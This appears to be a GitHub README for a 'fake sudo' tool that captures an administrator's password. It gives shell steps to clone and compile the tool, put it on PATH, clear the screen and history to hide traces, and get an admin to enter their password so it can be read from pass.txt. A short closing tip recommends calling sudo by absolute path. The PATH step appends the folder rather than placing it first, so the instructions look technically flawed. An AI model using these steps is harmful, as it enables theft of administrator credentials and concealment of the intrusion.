# Fake sudo program
Fake sudo to steal admin password

## Prepare your move

### Get the file
```bash
cd
git clone https://github.com/TheRaccoon00/fake_sudo.git
```

### Compile the program
```bash
cd fake_sudo
gcc -o sudo sudo.c
```

### Add it into ENV
```bash
export PATH=$PATH:~/fake_sudo
```

### Clear your screen and your history
```bash
cd
clear
history -c
```

## Let's go
Call your admin system and ask him to install a program (with your user session).

## Get the sudo password
```bash
cat ~/fake_sudo/pass.txt
```

## Security
To avoid that kind of hack, do not use environment variable :
```bash
sudo [command]
```
But prefer use the absolute path
```bash
/usr/bin/sudo [command]
```
